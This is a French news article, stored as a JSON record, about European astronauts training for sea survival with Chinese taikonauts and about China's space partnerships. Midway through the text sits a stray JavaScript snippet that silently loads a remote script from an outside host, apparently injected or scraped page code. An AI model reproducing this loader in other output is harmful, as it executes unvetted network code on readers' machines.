{"title": "Des astronautes européens s'entraînent pour voler à bord de la station spatiale chinoise", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "30/08/2017", "content": "Les astronautes européens Samantha Cristoforetti (italienne) et Matthias Maurer (allemand) ont débuté un cycle d'entraînement avec leurs homologues chinois. Objectif : préparer leur séjour à bord de la future station spatiale chinoise. Les  astronautes  européens peuvent s'attendre à une activité dense ces prochaines années. Alors que leurs séjours de longue durée à bord de l'ISS n'ont jamais été aussi nombreux, et que des perspectives attrayantes de missions habitées lointaines se présentent, ils réaliseront également des séjours à bord de la future station spatiale chinoise. En effet, la coopération entre la Chine et l' Agence spatiale européenne  (ESA) est au beau fixe. En début de mois, deux membres du corps européen des astronautes, l'Italienne Samantha Cristoforetti et l'Allemand Matthias Maurer, se sont entraînés pendant neuf jours avec 16 de leurs homologues chinois. Ils ont effectué un stage de survie en pleine mer, au large de la ville côtière chinoise de Yantai. C'était la première fois que des astronautes occidentaux s'entraînaient aux côtés de taïkonautes dans le cadre d'un stage de survie en mer. Cet entraînement est l'une des bases de toute formation d'astronautes. En effet, de retour d' orbite , ceux-ci doivent être préparés à toute éventualité, y compris un atterrissage d'urgence dans l'eau (amerrissage). L'astronaute européen Matthias Maurer, de nationalité allemande, s'entraîne à s'extraire en sécurité d'une capsule chinoise Shenzhou, sous les yeux d'un instructeur et d'une taïkonaute. © S. Corvaja, ESA                               Des astronautes européens à bord de la station spatiale chinoise Cela dit, ce n'est pas le premier entraînement d'astronautes réalisé en commun par les deux agences spatiales. En juillet 2016, le taïkonaute Ye Guangfu avait participé — avec une équipe multiculturelle qui rassemblait des astronautes de l'ESA, de la Nasa, de Roscosmos et de la Jaxa — à un stage de survie réalisé dans une grotte de Sardaigne, dans le cadre de la formation Caves, de l'Agence spatiale européenne ( Cooperative Adventure for Valuing and Exercising human behaviour and performance Skills ), à 800 mètres de profondeur.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ces deux échanges d'astronautes découlent d'un accord signé entre l'ESA et l'Agence spatiale chinoise en 2015. Ils visent à renforcer la collaboration entre les deux agences afin d'envoyer des astronautes européens à bord de la  station spatiale chinoise  à partir de 2022. Le saviez-vous ? L'Italienne Samantha Cristoforetti a rejoint le corps des astronautes européens en 2009. Elle a séjourné à bord de la Station spatiale internationale (ISS) pendant 200 jours, de novembre 2014 à juin 2015, dans le cadre de la  mission Futura , de l’ESA. Quant à Matthias Maurer, il est la dernière recrue du corps européen des astronautes. L'annonce de sa nomination officielle a été faite par l'ESA le 25 janvier 2017, mais sa formation initiale a en réalité démarré en juillet 2015. Les deux astronautes européens ont été enchantés de leur séjour chinois. Samantha Cristoforetti a expliqué : «  La formation a été superbement planifiée et menée. C'était une excellente occasion de rafraîchir mes compétences. P lus important encore, nous avons été accueillis en tant que collègues et amis par les taïkonautes et les instructeurs chinois  ». Les différences linguistiques et culturelles ont évidemment été un défi, explique-t-elle, mais «  elles ajoutent de la valeur, car nous nous concentrons tous sur le but commun : l'exploration spatiale  ». Quant à Matthias Maurer, il s'est voulu plus philosophique : «  Nous avons vraiment senti l'esprit d'appartenance à une famille d'astronautes universelle, partageant les mêmes valeurs, les mêmes objectifs et la même vision de l'exploration .  La langue était l'obstacle le plus difficile. Nous l'avons vaincu avec beaucoup d'enthousiasme et d'esprit d'équipe, parlant un mélange de chinois et d'anglais  ». Pour en savoir plus La Chine veut envoyer des astronautes étrangers dans sa future station Article de Rémy Decourt publié le 25 septembre 2013 Pour affirmer sa technologie spatiale à l'international, la Chine prend des chemins détournés. Consciente de ses faiblesses, et au lieu d'entrer en concurrence directe avec les autres puissances spatiales, elle fait le pari de la coopération et des partenariats avec l'Union européenne, les pays  émergents  et la Russie. Alors que s'est ouvert à Pékin le 64 e   Congrès international d’astronautique , événement annuel qui réunit tous les acteurs du secteur spatial du 23 au 27 septembre, l'agence spatiale chinoise a exprimé sa volonté de former des  astronautes étrangers  pour les envoyer en mission dans sa future station spatiale. Mieux encore, à l'instar de ce qu'avaient fait les États-Unis et l'Union soviétique en 1975 avec une rencontre spatiale entre les vaisseaux  Apollo  et  Soyouz , elle souhaite organiser un  rendez-vous orbital  avec un engin spatial étranger et réaliser une opération de sauvetage internationale. L'idée de la Chine d'étendre aux  vols habités  les partenariats spatiaux n'est guère surprenante. Devenu une puissance spatiale de premier plan, l'empire du Milieu veut franchir de nouvelles étapes et s'installer durablement sur les marchés internationaux des  technologies spatiales  (accès à l'espace, satellites, composants), et renforcer ses programmes de coopération pour assurer à son industrie des débouchés et de nouvelles compétences. Vue d'artiste de l'amarrage d'un vaisseau Shenzhou (à gauche) avec le module orbital Tiangong-1, en orbite depuis septembre 2011. Son successeur, Tiangong-2, devrait prendre le relais en 2015 et accueillera peut-être un jour un engin venu d'un autre pays que la Chine. © CNSA                               La Chine est loin d’être isolée dans le secteur spatial Pour cela, la Chine compte énormément sur les partenariats qu'elle noue avec des  pays émergents  ou en voie de développement, de façon à contourner les puissances occidentales concurrentes que sont principalement les États-Unis et l'Union européenne. En aidant ces pays à accéder aux retombées du secteur ( météorologie ,  télécommunications ,  observation de la Terre ), la Chine place à bon compte ses technologies spatiales. Si ces pays émergents n'en sont qu'aux balbutiements de leurs projets spatiaux, une fois ceux-ci devenus matures, la Chine sera au cœur de leurs investissements. C'est ce qui s'est passé entre la Russie et la Chine, et c'est pourquoi on remarque une très grande similitude entre leurs programmes. L'équipage de Shenzhou-9 avec la première Chinoise à avoir volé dans l'espace (Liu Yang, juin 2012). © CNSA                               Aujourd'hui, la Chine a signé plusieurs partenariats scientifiques et éducatifs avec de nombreux pays. On citera en exemple la coopération avec l'Agence spatiale européenne, qui se matérialise par des participations conjointes dans des  missions spatiales , ou encore le programme d'échange d'astronautes. La France coopère également dans des programmes de science de la vie, de médecine spatiale et d' astrobiologie . L'Allemagne est aussi un partenaire, elle avait ainsi fourni une expérience scientifique de science de la vie, embarquée à bord de  Shenzhou-8 . Mais, c'est avec la  Russie  - qui avait ouvert l'accès à ses technologies spatiales à la Chine à faible coût - que les liens sont les plus étroits. Aujourd'hui, ces deux puissances coopèrent presque entièrement dans le domaine des vols habités : de l'entraînement des astronautes à la réalisation des combinaisons spatiales, et de la conception des engins à l'exploitation des systèmes de transports. ", "theme": "sciences"}